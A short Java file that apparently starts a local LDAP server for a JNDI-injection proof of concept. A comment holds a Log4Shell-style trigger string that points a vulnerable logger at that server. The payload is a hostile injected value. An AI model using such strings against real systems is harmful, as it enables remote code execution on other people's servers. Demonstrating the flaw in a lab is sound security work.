public class Main
{
    public static void main(String[] args)
    {
        LDAPServer server = new LDAPServer(100);
        server.start();

        // Trigger message: ${jndi:ldap://localhost:100/e}
    }
}
